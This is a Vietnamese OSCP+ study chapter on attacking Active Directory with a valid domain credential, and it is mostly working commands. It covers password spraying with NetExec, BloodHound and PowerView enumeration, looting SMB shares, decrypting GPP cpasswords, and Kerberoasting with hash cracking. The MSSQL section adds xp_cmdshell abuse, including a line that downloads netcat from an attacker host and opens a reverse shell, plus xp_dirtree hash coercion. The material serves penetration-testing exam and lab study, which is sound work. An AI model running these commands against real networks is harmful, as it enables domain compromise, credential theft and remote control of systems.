# 03 — Có credential hợp lệ: Enumeration & tấn công đầu tiên

**Đây là điểm xuất phát của phần AD trong OSCP+** (assumed breach: đề bài cho
sẵn 1 user/password). Có credential domain bất kỳ = đọc được **gần như toàn bộ
AD** qua LDAP. Mục tiêu: tìm đường đi ngắn nhất tới Domain Admin.

Quy tắc vàng: **Mỗi khi có credential mới → lặp lại toàn bộ file này.**

---

## 1. Kiểm tra credential có thể làm gì

```bash
nxc smb   10.10.10.0/24 -u $USER -p $PASS              # (Pwn3d!) = local admin
nxc winrm 10.10.10.0/24 -u $USER -p $PASS              # (Pwn3d!) = vào được evil-winrm
nxc rdp   10.10.10.0/24 -u $USER -p $PASS
nxc mssql 10.10.10.0/24 -u $USER -p $PASS
nxc ldap  $DC -u $USER -p $PASS
nxc ssh   10.10.10.0/24 -u $USER -p $PASS              # Windows mới có OpenSSH

# Nếu là tài khoản local (không phải domain)
nxc smb 10.10.10.0/24 -u $USER -p $PASS --local-auth
```

Nếu WinRM được:

```bash
evil-winrm -i $TARGET -u $USER -p $PASS
*Evil-WinRM* PS> whoami /all          # nhóm + privilege → SeImpersonate? SeBackup? nhóm đặc biệt?
```

---

## 2. BloodHound — công cụ quan trọng nhất

**Giải thích:** BloodHound thu thập user, nhóm, session, ACL, quyền admin local,
GPO, trust… rồi dựng **đồ thị**; bạn hỏi "đường đi ngắn nhất từ user của tôi tới
Domain Admins" và nó vẽ ra chuỗi cạnh (edge) như `MemberOf → GenericAll →
ForceChangePassword → AdminTo`.

### 2.1. Thu thập dữ liệu

```bash
# Từ Kali (không cần chạm vào máy Windows)
bloodhound-python -u $USER -p $PASS -d $DOMAIN -ns $DC -c All --zip          # legacy BloodHound
bloodhound-ce-python -u $USER -p $PASS -d $DOMAIN -ns $DC -c All --zip       # BloodHound CE
nxc ldap $DC -u $USER -p $PASS --bloodhound -c All --dns-server $DC          # NetExec
# Lỗi DNS → thêm  --dns-tcp  hoặc  -dc DC01.corp.local
```

```powershell
# Từ Windows (thu được session & local admin tốt hơn)
PS> .\SharpHound.exe -c All --zipfilename loot.zip
PS> Import-Module .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public
```

> **Phiên bản phải khớp**: `bloodhound-python` (legacy) ↔ BloodHound 4.x;
> `bloodhound-ce-python`/SharpHound v2 ↔ BloodHound CE. Dữ liệu sai phiên bản sẽ
> import lỗi.

### 2.2. Khởi động & import

```bash
# BloodHound legacy
sudo neo4j console     # lần đầu vào http://localhost:7474 đổi mật khẩu neo4j
bloodhound             # kéo thả file zip vào

# BloodHound CE (docker)
curl -L https://ghst.ly/getbhce -o docker-compose.yml && docker compose up -d
# → http://localhost:8080, mật khẩu admin ban đầu in trong log: docker compose logs | grep -i password
```

### 2.3. Cách dùng hiệu quả

1. Tìm user của bạn → chuột phải **Mark as Owned**.
2. *Analysis / Cypher*:
   - **Shortest Paths to Domain Admins from Owned Principals**
   - Find AS-REP Roastable Users / Kerberoastable Users
   - Find Principals with DCSync Rights
   - Shortest Paths to Unconstrained Delegation Systems
   - Find Computers where Domain Users are Local Admin
3. Ở node user, xem tab **Outbound Object Control** (user này kiểm soát gì) và
   **First Degree Group Memberships**.
4. Chuột phải lên cạnh (edge) → **Help → Abuse** → BloodHound **hướng dẫn luôn lệnh
   khai thác** (Windows và Linux). Chi tiết abuse từng ACL ở [file 04](04-leo-thang-acl-delegation.md).

Cypher hữu ích (BloodHound CE, tab Cypher):

```cypher
// User có SPN (kerberoastable)
MATCH (u:User {hasspn:true}) RETURN u
// Máy có unconstrained delegation (trừ DC)
MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.name STARTS WITH 'DC' RETURN c
// Ai có thể đọc LAPS
MATCH p=()-[:ReadLAPSPassword]->(:Computer) RETURN p
// Mọi đường từ owned tới Domain Admins
MATCH p=shortestPath((u {owned:true})-[*1..]->(g:Group)) WHERE g.name STARTS WITH 'DOMAIN ADMINS' RETURN p
```

---

## 3. Enum LDAP / AD thủ công (khi BloodHound chưa đủ)

```bash
# Toàn bộ user + description
nxc ldap $DC -u $USER -p $PASS --users
nxc ldap $DC -u $USER -p $PASS --groups
nxc ldap $DC -u $USER -p $PASS -M get-desc-users
nxc ldap $DC -u $USER -p $PASS -M user-desc
nxc ldap $DC -u $USER -p $PASS --admin-count         # user được bảo vệ (từng/đang là admin)
nxc ldap $DC -u $USER -p $PASS --trusted-for-delegation
nxc ldap $DC -u $USER -p $PASS --password-not-required
nxc ldap $DC -u $USER -p $PASS -M maq                 # MachineAccountQuota (mặc định 10 → tạo được máy → RBCD)
nxc ldap $DC -u $USER -p $PASS -M adcs                # có ADCS không

# ldapdomaindump → HTML dễ đọc
ldapdomaindump -u "$DOMAIN\\$USER" -p $PASS $DC -o ldd/
firefox ldd/domain_users.html

# ldapsearch có xác thực
ldapsearch -x -H ldap://$DC -D "$USER@$DOMAIN" -w $PASS -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description info memberOf

# Thuộc tính bất thường: info, comment, userPassword, unixUserPassword, msSFU30Password, các thuộc tính custom
ldapsearch -x -H ldap://$DC -D "$USER@$DOMAIN" -w $PASS -b "DC=corp,DC=local" "(objectClass=user)" | grep -iE 'pass|pwd|info:|comment:'
```

### PowerView (trên Windows)

```powershell
PS> Import-Module .\PowerView.ps1
PS> Get-Domain; Get-DomainController
PS> Get-DomainUser | select samaccountname,description,memberof
PS> Get-DomainUser -SPN | select samaccountname,serviceprincipalname      # kerberoastable
PS> Get-DomainUser -PreauthNotRequired                                   # AS-REP roastable
PS> Get-DomainGroupMember "Domain Admins" -Recurse
PS> Get-DomainComputer | select dnshostname,operatingsystem
PS> Get-DomainComputer -Unconstrained
PS> Get-DomainUser -TrustedToAuth; Get-DomainComputer -TrustedToAuth     # constrained delegation
PS> Find-LocalAdminAccess                                                # user hiện tại là admin ở máy nào
PS> Find-DomainUserLocation                                              # admin đang login ở đâu (cần quyền)
PS> Get-NetSession -ComputerName FILE01
PS> Find-DomainShare -CheckShareAccess
PS> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "alice"}
PS> Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite"}
PS> Get-DomainGPO | select displayname,gpcfilesyspath
PS> Get-DomainTrust
```

Không có PowerView → module AD có sẵn (trên DC hoặc máy có RSAT) / lệnh native:

```powershell
PS> net user /domain ; net group "Domain Admins" /domain ; net group /domain
PS> Get-ADUser -Filter * -Properties description,servicePrincipalName | ?{$_.description}
PS> ([adsisearcher]"(servicePrincipalName=*)").FindAll() | %{$_.Properties.samaccountname}
PS> setspn -T corp.local -Q */*
```

---

## 4. SMB share với credential

```bash
nxc smb 10.10.10.0/24 -u $USER -p $PASS --shares          # quyền READ/WRITE từng share
nxc smb 10.10.10.0/24 -u $USER -p $PASS -M spider_plus -o DOWNLOAD_FLAG=True
smbmap -H $TARGET -u $USER -p $PASS -d $DOMAIN -r --depth 5
smbclient //$TARGET/Share -U "$DOMAIN/$USER%$PASS"
```

Tìm: `SYSVOL` / `NETLOGON` (script logon chứa mật khẩu), share `IT`, `Backup`,
`Dev`, file `.kdbx`, `.vhd/.vhdx` (mount ra lấy SAM), `.pfx`, `web.config`,
`unattend.xml`, `*.ps1`, file `.exe/.dll` tự viết (decompile bằng dnSpy/ILSpy →
mật khẩu LDAP – HTB *Support*, *Cascade*).

```bash
# KeePass
keepass2john db.kdbx > kp.hash && john kp.hash --wordlist=rockyou.txt
kpcli --kdb db.kdbx      # hoặc keepassxc
# ZIP / PFX
zip2john backup.zip > z.hash; pfx2john cert.pfx > p.hash; john ... --wordlist=rockyou.txt
# VHD: guestmount -a file.vhd -m /dev/sda1 --ro /mnt/vhd ; rồi secretsdump SAM/SYSTEM
```

---

## 5. GPP Passwords (Group Policy Preferences) — MS14-025

**Giải thích:** Trước 2014, admin có thể đặt mật khẩu local admin qua GPP; mật khẩu
được lưu trong `SYSVOL\<domain>\Policies\{GUID}\...\Groups.xml` dưới dạng
`cpassword` mã hóa AES với **khóa Microsoft công bố công khai** → giải mã ngay.
SYSVOL đọc được bởi mọi Domain User.

```bash
nxc smb $DC -u $USER -p $PASS -M gpp_password
nxc smb $DC -u $USER -p $PASS -M gpp_autologin          # Registry.xml autologon
impacket-Get-GPPPassword $DOMAIN/$USER:$PASS@$DC

# Thủ công
smbclient //$DC/SYSVOL -U "$DOMAIN/$USER%$PASS" -c 'recurse ON; prompt OFF; mget *'
grep -ri cpassword .
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```

```powershell
PS> Get-GPPPassword        # PowerSploit
PS> findstr /S /I cpassword \\corp.local\sysvol\corp.local\policies\*.xml
```

**Lab:** HTB *Active* (Groups.xml → `SVC_TGS`).

---

## 6. Kerberoasting

**Giải thích chi tiết:**
1. Tài khoản chạy dịch vụ (MSSQL, IIS…) có thuộc tính `servicePrincipalName` (SPN).
2. **Bất kỳ user domain nào** cũng xin được Service Ticket (TGS) cho SPN đó.
3. Một phần TGS được mã hóa bằng **NT hash của tài khoản dịch vụ** → crack offline.
4. Tài khoản dịch vụ thường có mật khẩu yếu, không đổi, và nhiều quyền.

> Tài khoản **máy** (`DC01$`) cũng có SPN nhưng mật khẩu ngẫu nhiên 120 ký tự →
> bỏ qua. Chỉ quan tâm **user** có SPN.

```bash
# Liệt kê
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC
# Lấy hash
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request -outputfile kerberoast.txt
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request-user svc_sql
nxc ldap $DC -u $USER -p $PASS --kerberoasting kerberoast.txt

# Crack
hashcat -m 13100 kerberoast.txt rockyou.txt                 # $krb5tgs$23$  (RC4)
hashcat -m 19600 kerberoast.txt rockyou.txt                 # $krb5tgs$17$  (AES128)
hashcat -m 19700 kerberoast.txt rockyou.txt                 # $krb5tgs$18$  (AES256)
```

```powershell
PS> .\Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
PS> .\Rubeus.exe kerberoast /user:svc_sql /nowrap
PS> .\Rubeus.exe kerberoast /tgtdeleg /nowrap      # ép RC4 khi tài khoản hỗ trợ (dễ crack hơn)
PS> Invoke-Kerberoast -OutputFormat Hashcat | fl    # PowerView
```

**Targeted Kerberoasting:** có `GenericWrite`/`GenericAll`/`WriteSPN` trên user →
**gán SPN giả** cho user đó → kerberoast → xóa SPN.

```bash
python3 targetedKerberoast.py -v -d $DOMAIN -u $USER -p $PASS --dc-ip $DC   # tự thêm SPN, roast, xóa
```

```powershell
PS> Set-DomainObject -Identity target -Set @{serviceprincipalname='fake/svc'}
PS> .\Rubeus.exe kerberoast /user:target /nowrap
PS> Set-DomainObject -Identity target -Clear serviceprincipalname
```

**Lab:** HTB *Active* (Administrator có SPN!), HTB *Administrator* (targeted
kerberoast `ethan`), PG *Nagoya*, PG *Access*, THM *Attacking Kerberos*, HTB
*Sizzle*.

---

## 7. MSSQL

```bash
nxc mssql $TARGET -u $USER -p $PASS                       # domain auth
nxc mssql $TARGET -u sa -p 'pass' --local-auth            # SQL auth
impacket-mssqlclient $DOMAIN/$USER:$PASS@$TARGET -windows-auth
impacket-mssqlclient sa:'pass'@$TARGET
```

Trong mssqlclient:

```sql
SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');   -- 1 = sysadmin
enum_db                                                     -- (lệnh của impacket)
SELECT name FROM sys.databases;
-- Chạy lệnh OS (cần sysadmin)
enable_xp_cmdshell
xp_cmdshell whoami
xp_cmdshell powershell -c "iwr http://LHOST/nc64.exe -o C:\Users\Public\nc.exe; C:\Users\Public\nc.exe LHOST 443 -e cmd"
-- Không phải sysadmin → bắt hash của tài khoản chạy SQL service (chạy responder trước)
xp_dirtree \\LHOST\share
EXEC master..xp_dirtree '\\LHOST\share';
-- Impersonate
enum_impersonate
EXECUTE AS LOGIN = 'sa';
-- Linked server
enum_links
EXEC ('xp_cmdshell ''whoami''') AT [SQL02];
```

Shell từ MSSQL thường chạy dưới tài khoản service → có **SeImpersonatePrivilege**
→ GodPotato/PrintSpoofer → SYSTEM (file 06).

Nếu có hash/mật khẩu tài khoản service → **Silver Ticket** cho MSSQL để vào với
quyền Administrator (file 08, PG *Nagoya*).

**Lab:** HTB *Escape* (`xp_dirtree` → `sql_svc`), HTB *Querier*, HTB *EscapeTwo*,
PG *Nagoya*.

---

## 8. Các điểm cần kiểm tra thêm với credential

| Kiểm tra | Lệnh | Tại sao |
|----------|------|---------|
| ADCS | `certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout` | ESC1/ESC4/ESC8… → DA trong 2 lệnh ([file 05](05-adcs.md)) |
| LAPS | `nxc ldap $DC -u $USER -p $PASS -M laps` | Đọc được mật khẩu admin local |
| gMSA | `nxc ldap $DC -u $USER -p $PASS --gmsa` | Đọc được hash tài khoản dịch vụ |
| MachineAccountQuota | `nxc ldap $DC -u $USER -p $PASS -M maq` | Tạo máy → RBCD |
| Delegation | `impacket-findDelegation $DOMAIN/$USER:$PASS -dc-ip $DC` | Unconstrained/Constrained/RBCD |
| Máy chưa vá | `nxc smb $DC -u $USER -p $PASS -M nopac` / `-M printnightmare` | |
| WebDAV client | `nxc smb 10.10.10.0/24 -u $USER -p $PASS -M webdav` | Coerce qua HTTP → relay LDAP |
| DNS records | `adidnsdump -u "$DOMAIN\\$USER" -p $PASS $DC` | Tìm host ẩn |
| Ai đang login ở đâu | `nxc smb 10.10.10.0/24 -u $USER -p $PASS --loggedon-users` | Mục tiêu dump credential |
| Quyền ghi DNS | `dnstool.py -u "$DOMAIN\\$USER" -p $PASS -r attacker -a add -d $LHOST $DC` | Bắt xác thực (HTB *Intelligence*) |

## Checklist

- [ ] Thử credential trên mọi giao thức/máy
- [ ] BloodHound – Mark owned – Shortest path
- [ ] Description/info của user
- [ ] Share (SYSVOL, NETLOGON, share tùy biến) + GPP
- [ ] AS-REP + Kerberoast (crack với rockyou + best64)
- [ ] ADCS, LAPS, gMSA, delegation, MAQ
- [ ] MSSQL
- [ ] Credential mới → **quay lại đầu file**
